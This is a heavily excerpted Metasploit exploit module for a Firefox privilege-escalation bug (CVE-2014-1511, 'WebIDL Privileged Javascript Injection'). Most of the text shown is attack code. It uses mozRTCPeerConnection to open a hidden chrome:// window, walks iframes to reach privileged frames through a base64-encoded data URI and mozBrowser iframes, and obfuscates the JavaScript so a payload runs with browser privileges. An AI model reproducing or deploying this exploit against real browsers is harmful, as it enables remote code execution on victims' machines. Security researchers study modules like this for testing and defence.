...
class Metasploit3 < Msf::Exploit::Remote
  ...
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Firefox WebIDL Privileged Javascript 
Injection',
      'Description'    => %q{
...
Javascript
      ...
      'References' => [
        ...
        ['CVE', '2014-1511']  # bypass popup blocker to load bare 
ChromeWindow
      ],
      'Targets' => [
        [
    ...
    register_options([
      OptString.new('CONTENT', [ false, "Content to display inside the 
HTML <body>.", "" ])
    ], self.class)
  end
  ...
  def generate_html(target_info)
    ...
    opts = { key => run_payload } # defined in 
FirefoxPrivilegeEscalation mixin
    data_uri = "data:text/html,<script>c = new 
mozRTCPeerConnection;c.createOffer(function()"+
               
"{},function(){top.vvv=window.open('chrome://browser/content/browser.xul', 
"+
               "'#{r}', 
'chrome,top=-9999px,left=-9999px,height=100px,width=100px');})<\/script>"
    ...
    js = Rex::Exploitation::JSObfu.new(%Q|
      ...
      // XUL script to pop open a new window with the chrome flag to 
prevent
      // the new window from being wrapped with browser XUL;
      function step1() {
        var clear = setInterval(function(){

          // throws until frames[0].frames[2] is available (when 
chrome:// iframe loads)
          frames[0].frames[2].location;

          // we base64 this to avoid the script tag screwing up things 
when obfuscated
...
frames[0].frames[2].location=window.atob('#{Rex::Text.encode_base64(data_uri)}');
      ...
      // gives us same-origin. Make sure to load an "<iframe 
mozBrowser>"
      // into the frame, since that will respond to our messageManager
      // (this is important later)
      function step2() {
        var clear = setInterval(function(){
          top.vvv.location = 'data:text/html,<html><body><iframe 
mozBrowser '+
...
'src="about:blank"></iframe></body></html>';
      ...
      function step3() {
        var clear = setInterval(function(){
          if (!frames[0]) return; // will throw until the frame is 
accessible
